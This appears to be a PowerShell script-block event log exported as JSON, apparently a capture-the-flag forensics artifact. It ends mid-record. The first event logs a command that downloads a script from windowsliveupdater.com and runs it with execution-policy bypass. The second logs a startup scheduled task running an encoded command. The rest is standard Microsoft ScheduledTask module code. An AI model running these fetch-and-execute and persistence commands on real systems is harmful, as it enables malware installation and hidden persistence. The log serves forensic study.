{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:16.239558Z"
    },
    "EventRecordID": 18,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-4DA6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5064,
      "ThreadID": 4104
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "$downloadUrl = \"http://windowsliveupdater.com/wLDwomPJLN.ps1\"; $destinationPath = \"$env:TEMP\\wLDwomPJLN.ps1\"; Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath; Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-ExecutionPolicy Bypass -File $destinationPath\" -Wait",
    "ScriptBlockId": "65f74888-6016-4c40-83a0-d30df299b264",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:17.415656Z"
    },
    "EventRecordID": 22,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0003-3BA0-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Get-ChildItem -Path \"$env:TEMP\" -Verbose\nGet-Process -Verbose\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-EncodedCommand JHRlbXBQYXRoID0gIiRlbnY6d2luZGlyXHRlbXBcR2gwc3QudHh0IgoiSFRCe0doMHN0X0wwYzR0MTBuIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdGVtcFBhdGggLUVuY29kaW5nIHV0Zjg=\"\n$trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName \"MaintenanceTask\" -Description \"\"\n",
    "ScriptBlockId": "677529ad-da67-4f73-a7b3-b3385eaed86b",
    "Path": "C:\\Users\\usr01\\AppData\\Local\\Temp\\wLDwomPJLN.ps1"
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.931924Z"
    },
    "EventRecordID": 23,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-13A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask'\r\n$script:ClassVersion = ''\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByPath', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByPath', Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='ByPath', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('TaskName') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskName})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskName', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('TaskPath') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskPath})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskPath', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Unregister-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByPath', SupportsShouldProcess=$true, ConfirmImpact='High', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByPath', Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='ByPath', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('TaskName') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskName})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskName', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('TaskPath') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskPath})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskPath', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('ByPath', 'InputObject (cdxml)') -contains $_ } {\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Unregister-ScheduledTask' -Alias '*'\r\n        \r\n",
    "ScriptBlockId": "843c9ce4-294d-4043-acdf-fec39070ff7e",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991185Z"
    },
    "EventRecordID": 24,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 19,
    "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/PS_ScheduledTask'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Disable-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('DisableByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('DisableByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Disable-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Enable-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991217Z"
    },
    "EventRecordID": 25,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 2,
    "MessageTotal": 19,
    "ScriptBlockText": "ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = 